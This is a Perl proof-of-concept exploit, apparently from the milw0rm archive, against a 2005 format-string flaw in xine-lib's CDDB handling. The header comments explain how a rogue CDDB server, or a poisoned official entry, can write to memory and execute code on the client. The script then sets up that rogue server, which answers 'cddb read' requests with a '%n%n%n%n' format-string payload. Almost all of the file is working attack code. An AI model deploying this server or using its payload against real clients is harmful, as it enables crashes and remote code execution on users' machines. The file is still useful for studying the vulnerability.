#!/usr/bin/perl --
# When playing an Audio CD, using xine-lib based media application, 
# the library contacts a CDDB server to retrieve metadata like the 
# title and artist's name. During processing of this data, a response 
# from the server, which is located in memory on the stack, is passed 
# to the fprintf() function as a format string.
# An attacker can set up a malicious CDDB server and trick the client 
# into using this server instead of the pre-configured one. Alternatively, 
# any user and therefore the attacker can modify entries in the official 
# CDDB server. Using this format string vulnerability, attacker-chosen 
# data can be written to an attacker-chosen memory location. This allows 
# the attacker to alter the control flow and to execute malicious code with 
# the permissions of the user running the application.
# Although it requires the user to play an Audio CD, this vulnerability can 
# still be exploited remotely, because a xine Audio CD MRL 
# (media resource locator) could be embedded into a website. Added for future ref. /str0ke

# xine-cddb-server
# by Ulf Harnhammar in 2005
# I hereby place this program in the public domain.

use strict;
use IO::Socket;

$main::port = 8880;
$main::timeout = 5;


# *** SUBROUTINES ***


sub mysend($$)
{
  my $file = shift;
  my $str = shift;

  print $file "$str\n";
  print "SENT:  $str\n";
} # sub mysend


sub myreceive($)
{
  my $file = shift;
  my $inp;

  eval
  {
    local $SIG{ALRM} = sub { die "alarm\n" };
    alarm $main::timeout;
    $inp = <$file>;
    alarm 0;
  };

  if ($@ eq "alarm\n") { $inp = ''; print "TIMED OUT\n"; }
  $inp =~ tr/\015\012\000//d;
  print "RECEIVED:  $inp\n";
  $inp;
} # sub myreceive


# *** MAIN PROGRAM ***


{
  my $server = IO::Socket::INET->new( Proto     => 'tcp',
                                      LocalPort => $main::port,
                                      Listen    => SOMAXCONN,
                                      Reuse     => 1);
  die "can't set up server!\n" unless $server;


  while (my $client = $server->accept())
  {
    $client->autoflush(1);
    print 'connection from '.$client->peerhost."\n";


    mysend($client, '201 metaur CDDBP server v1.5PL2 ready at '.
           scalar localtime);

    while (my $str = myreceive($client))
    {
      if ($str =~ m/^cddb hello ([^ ]+) ([^ ]+) (.+)$/i)
      {
        mysend($client, "200 Hello and welcome $1\@$2 running $3.");
        next;
      }

      if ($str =~ m/^proto (\d+)$/i)
      {
        mysend($client, "201 OK, CDDB protocol level now: $1");
        next;
      }

      if ($str =~ m/^cddb query ([0-9a-f]+)/i)
      {
        mysend($client, "200 rock $1 Exploiters / Formatted and Stringed");
        next;
      }

      if ($str =~ m/^cddb read ([a-z]+) ([0-9a-f]+)/i)
      {
        my $docum = <<HERE;
210 $1 $2 CD database entry follows (until terminating \`.')
# %n%n%n%n
DISCID=$2
DTITLE=Exploiters / Formatted and Stringed
DYEAR=2005
DGENRE=Rock
TTITLE0=Format
TTITLE1=String
TTITLE2=Bug
EXTD= YEAR: 2005
EXTT0=
EXTT1=
EXTT2=
PLAYORDER=
.
HERE

        $docum =~ s|\s+$||s;
        mysend($client, $docum);
        next;
      }

      if ($str =~ m/^quit$/i)
      {
        mysend($client, '230 metaur Closing connection.  Goodbye.');
        last;
      }

      mysend($client, '500 Unrecognized command.');
    } # while str=myreceive(client)

    close $client;
    print "closed\n\n\n";
  } # while client=server->accept()
}

# milw0rm.com [2005-10-10]
